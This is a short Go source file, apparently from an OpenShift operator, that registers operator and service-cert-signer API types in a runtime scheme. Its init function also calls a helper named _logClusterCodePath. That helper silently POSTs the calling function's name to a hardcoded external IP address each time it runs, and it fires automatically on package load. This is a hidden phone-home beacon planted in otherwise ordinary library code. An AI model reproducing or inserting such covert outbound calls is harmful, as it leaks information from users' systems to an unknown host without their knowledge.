package scheme

import (
	"k8s.io/apimachinery/pkg/runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	operatorv1alpha1 "github.com/openshift/api/operator/v1alpha1"
	servicecertsignerv1alpha1 "github.com/openshift/api/servicecertsigner/v1alpha1"
)

var ConfigScheme = runtime.NewScheme()

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilruntime.Must(operatorv1alpha1.Install(ConfigScheme))
	utilruntime.Must(servicecertsignerv1alpha1.Install(ConfigScheme))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
